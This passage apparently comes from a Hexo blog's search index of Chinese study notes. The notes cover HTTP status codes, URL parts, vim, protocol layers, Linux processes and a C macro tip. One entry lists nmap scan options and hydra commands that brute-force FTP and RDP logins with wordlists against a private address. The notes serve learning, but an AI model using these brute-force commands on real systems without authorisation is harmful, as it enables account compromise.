服务器未能实现合法请求</p></blockquote><p>常见响应状态码：</p><blockquote><p>200  ok</p><p>400  bad request  客户端有语法错误</p><p>401  Unauthorized   未经授权</p><p>403  Forbidden  服务器端收到请求，但拒绝提供服务</p><p>404  请求资源不存在/输入了错误的url</p><p>500  Internal Server Error 服务器发生不可预期的错误</p><p>503  服务器当前不能处理客户端的请求，一段时间后可能恢复正常</p></blockquote><h3 id="URL-：统一资源定位符（也就是常说的网址）"><a href="#URL-：统一资源定位符（也就是常说的网址）" class="headerlink" title="URL ：统一资源定位符（也就是常说的网址）"></a>URL ：统一资源定位符（也就是常说的网址）</h3><p>一个完整的URL包含以下部分</p><blockquote><p><a href="http://user:pass@www.example.jp/dir/index.htm?uid=1#ch1">http://user:pass@www.example.jp:80/dir/index.htm?uid=1#ch1</a></p><p>http://  协议方案名</p><p>user:pass 登录信息（认证）</p><p><a href="http://www.example.jp/">www.example.jp</a>  服务器地址</p><p>80 端口号</p><p>/dir/index.htm  带层次的文件路径</p><p>uid=1  查询字符串</p><p>ch1  片段标识符</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> http请求报文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap和hydra常用命令</title>
      <link href="/2023/04/05/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/nmap%E5%92%8Chydra%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/04/05/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/nmap%E5%92%8Chydra%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="扫描与爆破"><a href="#扫描与爆破" class="headerlink" title="扫描与爆破"></a>扫描与爆破</h3><p>Nmap<br>重要常用命令参数</p><p><code>-sP     ping扫描</code><br>例：</p><blockquote><p>nmap -sP 10.1.1.0/24  （最后的24是采用二进制表示的掩码的位数）</p></blockquote><p><code>-p     指定端口范围</code><br>例：</p><blockquote><p>nmap -p 21,23 10.1.1.1（探测目标21，23端口情况）</p></blockquote><p><code>-sV      服务版本探测</code><br>例：</p><blockquote><p>nmap -p 23,21 10.1.1.1 -sV</p></blockquote><p><code>-O     启用操作系统探测（同时可以扫描开放的端口号以及对应的服务）</code><br>例：</p><blockquote><p>nmap -O 10.1.1.1</p></blockquote><p><code>-A     全面扫描</code></p><p><code>-oN     保存txt(保存扫描报告)</code><br>例：</p><blockquote><p>nmap -O 10.1.1.1 -oN d:\baogao.txt（保存路径）</p></blockquote><h3 id="hydra-常用命令"><a href="#hydra-常用命令" class="headerlink" title="hydra 常用命令"></a>hydra 常用命令</h3><p>(转载自<a href="https://blog.csdn.net/weixin_63286108/article/details/124700517">https://blog.csdn.net/weixin_63286108/article/details/124700517</a>)</p><p>爆破FTP服务器登录密码（已知用户名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/passwd.txt ftp://192.168.31.134</span><br></pre></td></tr></table></figure><p>爆破FTP服务器的用户名和密码(1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/uname.txt -P /usr/passwd.txt ftp://192.168.31.134</span><br></pre></td></tr></table></figure><p>爆破FTP服务器的用户名和密码(2)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -C /usr/u_and_p.txt ftp://192.168.31.134</span><br></pre></td></tr></table></figure><p>爆破远程桌面服务的用户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /usr/uname.txt -P /usr/passwd.txt rdp://192.168.31.134</span><br></pre></td></tr></table></figure><p>(uname.txt、passwd.txt分别为用户名字典和密码字典)</p>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> Nmap和hydra常用命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim初学</title>
      <link href="/2023/04/05/%E5%B0%8F%E5%AF%84%E5%B7%A7/Vim%E5%88%9D%E5%AD%A6/"/>
      <url>/2023/04/05/%E5%B0%8F%E5%AF%84%E5%B7%A7/Vim%E5%88%9D%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="vim的三个模式"><a href="#vim的三个模式" class="headerlink" title="vim的三个模式"></a>vim的三个模式</h2><p>vim有三个模式</p><ul><li>正常模式</li><li>编辑模式</li><li>命令行模式</li></ul><p>刚打开文件处于正常模式</p><blockquote><p>编辑模式按 esc 会退出到正常模式</p></blockquote><p>要进行编辑需要进入编辑模式</p><blockquote><p>按小写 i，此时下方会提示进入了INSERT模式</p></blockquote><p>保存修改，或不做修改退出，或对文件进行搜索等  要进入命令行模式</p><blockquote><p>正常模式直接输入 : 会进入命令行模式。同样，下方也会有提示“：”</p><p>退出（quit）：输入 :q，回车。（如果对文件做出了修改，那么会出现警示</p><p>不保存退出： 输入 :q! 表示无论如何都要退出</p><p>保存退出（write  quit）： 输入 :wq（先保存，再退出，不能写为 :qw</p></blockquote><h2 id="vim的光标移动"><a href="#vim的光标移动" class="headerlink" title="vim的光标移动"></a>vim的光标移动</h2><p>在正常模式下 h j k l 四个键可以进行光标的移动</p><blockquote><p>k：向上</p><p>j：向下</p><p>h：向左</p><p>l：向右</p></blockquote><p>正常模式下，将光标移动到字符后</p><blockquote><p>按 i ：insert 在字符前面插入字符</p><p>按 a：append 在字符后面追加字符</p><p>大写i：shift+i  插到最前面</p><p>大写a： shift+a  在最后面追加</p><p>o：（open a new line ）在本行的下面新建一行</p><p>大写o： 在本行的上面新建一行</p><p>g：在最后一行下面新建一行</p><p>gg：在最初一行上面增加一行</p><p>w： （word）跳动到下一个词的开头</p><p>e：（end）跳动到单词最后</p><p>b： （back）上一个单词开头</p></blockquote><h2 id="vim的复制、粘贴、删除"><a href="#vim的复制、粘贴、删除" class="headerlink" title="vim的复制、粘贴、删除"></a>vim的复制、粘贴、删除</h2><blockquote><p>ctrl+v： 进入视觉模式（可视化块）类似于平时使用的shift+方向键，用于选中一段文字进行操作</p><p>shift+v：同样是进入视觉模式，不同的是选中一整行，如果向下选择，会把下面的行也选中</p><p>y：复制选中</p><p>yy：（yank）复制当前行</p><p>yw：（yank word）复制当前单词</p></blockquote><blockquote><p>p：（paste）粘贴</p></blockquote><blockquote><p>d: 删除选中</p><p>dd：删除当前行</p><p>dw：（delete a word）删除当前字符</p><p>cw： 替换当前单词（删除当前字符，并且进入编辑模式）</p><p>ci：（change in）删除括号内的内容</p></blockquote><blockquote><p>.  ：重复上一次操作</p><p>u：（undo）撤销上一次操作</p><p>ctrl+r： 恢复前一次操作（不小心撤回过多使用</p></blockquote><h2 id="命令行用法"><a href="#命令行用法" class="headerlink" title="命令行用法"></a>命令行用法</h2><blockquote><p>最基本的:q :q! :wq</p></blockquote><blockquote><p>:/+要搜索的字符串： 快速搜索定位</p><p>:%s/旧字符/新字符/g：（最后的g表示gobel，全局替换）把文件中的“旧字符”全部替换成“新字符”</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 小寄巧 </category>
          
          <category> vim初学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各层常用协议</title>
      <link href="/2023/04/05/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E5%90%84%E5%B1%82%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/04/05/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E5%90%84%E5%B1%82%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="各层常用协议"><a href="#各层常用协议" class="headerlink" title="各层常用协议"></a>各层常用协议</h1><h2 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h2><blockquote><p>http  https  SSH  DNS  Telnet   FTP      DHCP    SMTP   POP3   RDP     SMB    MySql<br>80    443     22     53       23    20/21      67/68      25        110      3389      445      3306</p></blockquote><h2 id="传输层协议"><a href="#传输层协议" class="headerlink" title="传输层协议"></a>传输层协议</h2><blockquote><pre><code> ​    TCP                                 UDP 传输控制协议             用户数据报协议</code></pre></blockquote><h2 id="网络层协议"><a href="#网络层协议" class="headerlink" title="网络层协议"></a>网络层协议</h2><blockquote><p>ICMP<br>Internet Control Message Protocol<br>internet控制报文协议 用于在ip主机、路由器之间传递控制消息（网络是否通，主机是否可达）。</p></blockquote><blockquote><p>IP<br>Internet Protocol<br>网际互连协议：实现大规模、异构网络的互联互通。</p></blockquote><blockquote><p>ARP<br>Address Resolution Protocol<br>地址解析协议：根据IP地址获取物理地址的协议</p></blockquote><h2 id="数据链路层协议"><a href="#数据链路层协议" class="headerlink" title="数据链路层协议"></a>数据链路层协议</h2><blockquote><p>PPP<br>Point-to-Point Protocal—–ppp点到点：数据链路层封装协议中的一种，常用于广域网，使用串行链路提供远距离数据传输服务。</p></blockquote><blockquote><p>Ethernet<br>以太网：实现链路层的数据传输和地址封装（MAC，常用于局域网。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安基础 </category>
          
          <category> 各层常用协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux多进程编程</title>
      <link href="/2023/04/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-Linux%E7%BC%96%E7%A8%8B/%E7%AC%AC%E4%BA%94%E7%AB%A0%E3%80%81Linux%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
      <url>/2023/04/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-Linux%E7%BC%96%E7%A8%8B/%E7%AC%AC%E4%BA%94%E7%AB%A0%E3%80%81Linux%E5%A4%9A%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux多进程编程"><a href="#Linux多进程编程" class="headerlink" title="Linux多进程编程"></a>Linux多进程编程</h1><hr><h3 id="一、-并发概念"><a href="#一、-并发概念" class="headerlink" title="一、 并发概念"></a>一、 并发概念</h3><p>并发：</p><blockquote><p>指多个活动在同一时间段内同时进行</p></blockquote><h3 id="二、-逻辑控制流"><a href="#二、-逻辑控制流" class="headerlink" title="二、 逻辑控制流"></a>二、 逻辑控制流</h3><p>逻辑流：</p><blockquote><p>在多进程运行环境下，一个程序（或进程）按程序员意图，从main函数开始，一个一个语句，一条一条指令执行，执行轨迹为一系列程序计数器（PC）的值，给人一种每个程序都独占处理器的假象，而一般整个系统可能仅有一个CPU，各进程轮流执行，我们称进程为一个逻辑流</p></blockquote><p>实际上，每个进程的执行过程是不连续的，它们交替使用处理器</p><p>并发流：</p><blockquote><p>只要某种可能的执行模式在时间上存在重叠，它们就是并发流。</p></blockquote><p>并行流：</p><blockquote><p>如果两个流在有部分操作（或代码）同一时刻地运行在<strong>不同的</strong>处理器核或者计算机上，那么我们称它们为并行流(parallel flow)</p></blockquote><p>多任务：</p><blockquote><p>一个进程和其他进程轮流运行的概念</p></blockquote><p><strong>时间片</strong>：</p><blockquote><p>每次分配给一个进程的执行时间称之为<strong>时间片</strong>(time slice)，进程也因此划分为多个做<strong>时间分片</strong>(time slicing)</p></blockquote><h1 id="进程的基本概念"><a href="#进程的基本概念" class="headerlink" title="进程的基本概念"></a>进程的基本概念</h1><h2 id="初识进程"><a href="#初识进程" class="headerlink" title="初识进程"></a>初识进程</h2><h3 id="一、-什么是进程"><a href="#一、-什么是进程" class="headerlink" title="一、 什么是进程"></a>一、 什么是进程</h3><blockquote><p>进程是正在执行中的程序</p></blockquote><h3 id="二、-进程结构"><a href="#二、-进程结构" class="headerlink" title="二、 进程结构"></a>二、 进程结构</h3><p>进程至少包含三项内容：</p><ul><li>程序代码</li><li>数据集</li><li>进程控制块</li></ul><blockquote><p>程序代码：一般是一个包括main函数的可执行程序，程序装载到内存，进程才能启动</p></blockquote><blockquote><p>数据集：进程的处理对象，可认为是变量内容，保存从初始化、环境变量、命令行参数和文件的数据</p></blockquote><blockquote><p>PCB：保存程序代码、数据变量地址、进程其他属性，<em>PCB</em>是进程存在的唯一标志，以后操作系统就通过PCB来对进程实施管理和控制</p></blockquote><h3 id="三、进程属性（保存在PCB中"><a href="#三、进程属性（保存在PCB中" class="headerlink" title="三、进程属性（保存在PCB中"></a>三、进程属性（保存在PCB中</h3><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230404143547405.png"></p><p>进程描述信息：</p><blockquote><p>进程号（PID）</p><p>用户标识</p><p>用户组标识</p><p>进程族亲信息：父进程标识、兄弟进程标识</p></blockquote><p>控制信息：</p><blockquote><p>进程状态</p><p>调度信息：优先级、剩余时间片和调度策略</p><p>记时信息：CPU使用时间等</p><p>通信信息：未处理信号、管道、消息队列、共享内存等</p></blockquote><p>资源信息：</p><blockquote><p>存储器地址</p><p>打开文件的信息</p></blockquote><p>cpu现场信息：</p><blockquote><p>当前进程CPU寄存器副本：程序计数器PC、通用寄存器、标识寄存器FLAGS</p></blockquote><h3 id="PCB的实例（Linux任务结构体：task-struct"><a href="#PCB的实例（Linux任务结构体：task-struct" class="headerlink" title="PCB的实例（Linux任务结构体：task_struct"></a>PCB的实例（Linux任务结构体：task_struct</h3><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230404144612237.png" alt="image-20230404144612237"></p><h2 id="进程基本状态及转换"><a href="#进程基本状态及转换" class="headerlink" title="进程基本状态及转换"></a>进程基本状态及转换</h2><p>三种基本状态：</p><blockquote><ul><li>就绪</li><li>运行</li><li>阻塞</li></ul></blockquote><p>然而，在操作系统实际设计中往往增加了两种状态</p><blockquote><ul><li>创建</li><li>终止</li></ul></blockquote><p><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/image-20230404145422917.png" alt="image-20230404145422917"></p><h2 id="操作进程的工具"><a href="#操作进程的工具" class="headerlink" title="操作进程的工具"></a>操作进程的工具</h2><p>ps命令查看进程信息</p><blockquote><p>ps -ef 显示全部进程信息</p></blockquote><blockquote><p><strong>ps</strong> -ef| grep bash 从ps命令中过滤出指定进程信息</p></blockquote><blockquote><p>ps -u  命令显示当前用户拥有进程资源消耗信息</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux编程 </category>
          
          <category> 多进程编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c语言常遇到的错误集</title>
      <link href="/2023/04/05/c%E8%AF%AD%E8%A8%80/%E5%B8%B8%E9%81%87%E5%88%B0%E7%9A%84%E9%94%99%E8%AF%AF/"/>
      <url>/2023/04/05/c%E8%AF%AD%E8%A8%80/%E5%B8%B8%E9%81%87%E5%88%B0%E7%9A%84%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<h4 id="当遇到数组越界类的错误时，很有可能是宏定义的maxsize出了问题"><a href="#当遇到数组越界类的错误时，很有可能是宏定义的maxsize出了问题" class="headerlink" title="当遇到数组越界类的错误时，很有可能是宏定义的maxsize出了问题"></a>当遇到数组越界类的错误时，很有可能是宏定义的maxsize出了问题</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10</span></span><br></pre></td></tr></table></figure><p>宏定义的maxsize过小</p>]]></content>
      
      
      <categories>
          
          <category> c# </category>
          
          <category> c语言错误集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/04/03/hello-world/"/>
      <url>/2023/04/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
